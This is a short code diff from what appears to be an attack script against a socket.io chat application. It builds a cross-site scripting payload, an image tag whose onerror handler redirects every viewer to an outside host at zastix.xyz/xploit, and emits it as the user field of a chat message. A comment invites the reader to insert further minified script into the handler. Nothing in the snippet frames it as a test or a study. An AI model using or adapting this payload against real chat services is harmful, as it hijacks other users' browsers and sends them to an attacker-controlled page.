@@ -1,7 +1,7 @@
 // OnError method
 xxs = `<img src="e.png" onerror="location.href='https://zastix.xyz/xploit'">`
 socket.emit('chat message', {
-    message: '',
+    message: "",
     user: xxs
   })
 // Put your minified code in onerror="CODE HERE"
